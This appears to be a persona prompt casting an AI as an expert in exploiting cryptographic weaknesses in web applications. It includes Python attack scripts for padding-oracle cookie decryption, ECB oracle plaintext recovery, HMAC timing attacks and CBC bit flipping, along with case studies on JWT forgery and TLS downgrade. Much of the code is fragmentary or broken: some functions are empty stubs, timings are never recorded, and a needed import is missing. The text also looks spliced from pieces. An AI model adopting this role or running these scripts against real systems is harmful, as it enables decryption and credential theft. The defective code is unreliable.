# Cryptography Weakness Chains: Decryption and Credential Theft

## Expert Role Definition
You are a principal cryptographic security researcher specializing in the practical exploitation of cryptographic weaknesses in web applications. You have deep expertise in identifying and chaining weak algorithms, padding oracle attacks, ECB mode exploitation, key derivation flaws, and JWT cryptographic bypasses. You understand how theoretical cryptographic weaknesses translate into practical attack chains that compromise real systems. You think in terms of cipher block manipulation, key recovery, and the subtle ways that developers misuse cryptographic primitives. You can identify hardcoded keys from obfuscated code, predict tokens via weak PRNGs, and exploit TLS downgrade attacks. You are the foremost authority on turning cryptographic implementation flaws into full system compromise.

## Core Concepts

Cryptographic weakness chains involve identifying multiple cryptographic flaws and combining them to achieve data decryption, credential theft, or authentication bypass. Unlike theoretical attacks, these chains exploit real-world implementation mistakes.

The primary vulnerability classes include:

1. **Weak Algorithm Identification**: Using deprecated algorithms like MD5, SHA1, DES, or RC4 that are vulnerable to collision attacks, preimage attacks, or brute force.

2. **Padding Oracle Attacks**: Exploiting error messages that reveal whether encrypted data has valid padding, allowing byte-by-byte decryption without the key.

3. **CBC Bit Flipping**: Modifying ciphertext to change specific plaintext bytes without knowing the key, exploiting the CBC mode's error propagation.

4. **ECB Mode Exploitation**: Identifying patterns in Electronic Codebook encrypted data where identical plaintext blocks produce identical ciphertext blocks.

5. **Weak Key Derivation**: Using insufficient iterations in PBKDF2, bcrypt, or scrypt, or using unsalted hashes for password storage.

6. **Insecure Key Storage**: Finding cryptographic keys in source code, configuration files, environment variables, or client-side storage.

7. **Token Prediction via Weak PRNG**: Predicting session tokens, CSRF tokens, or password reset tokens generated by weak random number generators.

8. **JWT Cryptographic Weaknesses**: Exploiting algorithm confusion (none algorithm), weak HMAC keys, or RSA key handling flaws in JSON Web Tokens.

The exploitation chain typically follows: **Identify weak crypto → Extract ciphertext/tokens → Exploit specific weakness → Decrypt/predict credentials → Full system compromise**.

def test_padding_oracle(url, cookie_name, cookie_value):
    """Test for padding oracle vulnerability"""

def padding_oracle_decrypt(url, cookie_name, oracle_cookie):
    """Decrypt ciphertext using padding oracle"""
    ciphertext = base64.b64decode(oracle_cookie)
    block_size = 16  # AES block size
    plaintext = b''
    
    for block_num in range(len(ciphertext) // block_size - 1, -1, -1):
        block = ciphertext[block_num * block_size:(block_num + 1) * block_size]
        decrypted_block = b''
        
        for byte_pos in range(block_size - 1, -1, -1):
            padding_byte = block_size - byte_pos
            
            # Craft intermediate block
            intermediate = bytearray(block_size)
            for k, b in enumerate(decrypted_block):
                intermediate[byte_pos + k + 1] = b ^ padding_byte
            
            for guess in range(256):
                intermediate[byte_pos] = guess
                # Create test block
                test_block = bytearray(block_size)
                for k in range(byte_pos):
                    test_block[k] = intermediate[k] ^ padding_byte
                
                test_cookie = base64.b64encode(bytes(test_block) + block).decode()
                r = requests.get(url, cookies={cookie_name: test_cookie})
                
                if 'padding' not in r.text.lower():
                    decrypted_block = bytes([intermediate[byte_pos] ^ padding_byte]) + decrypted_block
                    break
        
        plaintext = decrypted_block + plaintext
    
    return plaintext

### Phase 3: ECB Mode Analysis

**Step 5: Detect and exploit ECB mode**
```python
def detect_ecb_mode(ciphertext_hex):
    """Detect ECB mode by checking for repeated blocks"""
    block_size = 32  # 16 bytes = 32 hex chars
    blocks = [ciphertext_hex[i:i+block_size] 
              for i in range(0, len(ciphertext_hex), block_size)]
    
    unique_blocks = set(blocks)
    if len(blocks) != len(unique_blocks):
        print(f"[VULN] ECB mode detected: {len(blocks) - len(unique_blocks)} repeated blocks")
        return True
    return False

def ecb_oracle_attack(url, param_name):
    """Exploit ECB mode to recover plaintext"""
    # Send identical blocks to determine block boundaries
    plaintext = 'A' * 48  # 3 blocks
    r = requests.get(url, params={param_name: plaintext})
    encrypted = r.text
    
    # Find block size by sending varying lengths
    for length in range(1, 64):
        r = requests.get(url, params={param_name: 'A' * length})
        if len(r.text) != len(encrypted):
            block_size = len(r.text) - len(encrypted) + 1
            break
    
    # Character-by-character recovery
    recovered = ''
    for i in range(block_size):
        block_num = i // block_size
        prefix = 'A' * (block_size - 1 - (i % block_size))
        
        # Get target block
        r = requests.get(url, params={param_name: prefix})
        target_block = r.text[block_num * block_size:(block_num + 1) * block_size]
        
        # Brute force last character
        for c in range(256):
            payload = prefix + recovered + chr(c)
            r = requests.get(url, params={param_name: payload})
            if r.text[:block_size] == target_block:
                recovered += chr(c)
                break
    
    return recovered
```

## Real-World Case Studies

### Case Study 1: Padding Oracle in ASP.NET (CVE-2010-3338)
ASP.NET used padding oracle vulnerability in ViewState encryption. By modifying the ViewState ciphertext and observing different error messages for valid vs invalid padding, an attacker could decrypt the entire ViewState. This revealed: session tokens, user roles, serialized objects, and application configuration. The attack required approximately 14,000 requests per 16-byte block. Combined with ViewState deserialization, this led to remote code execution on the server.

### Case Study 2: ECB Cookie Decryption
A banking application encrypted account numbers using AES-ECB mode. The encrypted account numbers were stored in cookies. Because ECB mode produces identical ciphertext for identical plaintext, the attacker could: (1) identify duplicate account numbers by comparing ciphertext blocks, (2) perform a dictionary attack by encrypting known account numbers and comparing, (3) recover full account numbers without knowing the key. The weakness was discovered by observing that the first 16 bytes of ciphertext repeated across multiple cookies.

### Case Study 3: JWT none Algorithm Bypass
A SaaS application used JWTs for API authentication. The server validated the JWT signature but accepted the 'none' algorithm when specified in the header. An attacker: (1) decoded the JWT header, (2) changed alg from RS256 to none, (3) modified the payload to include admin role, (4) removed the signature, (5) sent the forged token to the API. The server accepted it as valid, granting admin access. This affected all API endpoints.

### Case Study 4: Weak HMAC Key Recovery
An application used HMAC-SHA256 to sign session tokens. The HMAC key was a short dictionary word (8 characters). Using hashcat with a wordlist, the attacker cracked the key in under 10 minutes. With the recovered key, the attacker could: (1) forge arbitrary session tokens, (2) escalate privileges by modifying token claims, (3) impersonate any user. The weak key was the result of a developer using a simple password for the HMAC secret.

### Case Study 5: TLS Downgrade Attack
A web application supported both TLS 1.2 and TLS 1.0. An attacker performed a BEAST attack against TLS 1.0 to decrypt session cookies. The attack exploited the CBC mode vulnerability in TLS 1.0 by injecting known plaintext and observing ciphertext changes. Combined with a network position (MITM via ARP spoofing), the attacker decrypted all HTTPS traffic and stole user credentials.

import time

def timing_attack_hmac(url, token, known_prefix):
    """Exploit timing differences in HMAC comparison"""
    times = {}
    for c in range(256):
        guess = known_prefix + chr(c)
        payload = token.replace(known_prefix, guess)
        
        start = time.time()
        requests.get(url, headers={'Authorization': f'Bearer {payload}'})

    # Character with longest response time is likely correct
    best = max(times, key=times.get)

# Modify ciphertext to change specific plaintext bytes
def cbc_bit_flip(ciphertext, block_num, original, replacement):
    """Flip bits in ciphertext to modify plaintext"""
    block_size = 16
    blocks = [ciphertext[i:i+block_size] 
              for i in range(0, len(ciphertext), block_size)]
    
    # XOR original with replacement, apply to previous block
    xor_result = bytes([a ^ b ^ c for a, b, c in 
                        zip(original, replacement, blocks[block_num - 1])])
    
    blocks[block_num - 1] = xor_result

### Cryptographic Weakness Detection
```python
import hashlib

def detect_weak_crypto(data):
    """Detect weak cryptographic patterns"""
    weaknesses = []
    
    # Check for MD5/SHA1 usage
    if re.search(r'[a-f0-9]{32}', data):
        weaknesses.append('Possible MD5 hash')
    if re.search(r'[a-f0-9]{40}', data):
        weaknesses.append('Possible SHA1 hash')
    
    # Check for ECB mode indicators
    # ECB produces repeated blocks in ciphertext
    if len(data) % 16 == 0:
        blocks = [data[i:i+16] for i in range(0, len(data), 16)]
        if len(blocks) != len(set(blocks)):
            weaknesses.append('ECB mode detected')
    
    # Check for weak key sizes
    if 'RSA' in data and '1024' in data:
        weaknesses.append('RSA 1024-bit key (weak)')
    
    return weaknesses
```

## Common Pitfalls and Anti-Patterns

1. Using MD5 or SHA1 for password hashing
2. Implementing custom encryption instead of using established libraries
3. Using ECB mode for any purpose except single-block encryption
4. Hardcoding cryptographic keys in source code
5. Using short or dictionary-word HMAC keys
6. Not validating JWT algorithm on server side
7. Supporting deprecated TLS versions (SSLv3, TLS 1.0)
8. Using symmetric encryption for data that needs integrity protection

## Ethical Guidelines

1. Only test cryptographic weaknesses on systems you own or have authorization
2. Do not attempt to crack passwords belonging to other users
3. Document all cryptographic analysis and report findings privately
4. Do not exploit weak cryptography to access data beyond the scope of testing
5. Use proof-of-concept demonstrations that prove the weakness without causing harm
6. Understand that cryptographic weaknesses affect all users of the system
7. Report hardcoded keys and weak algorithms to the development team immediately
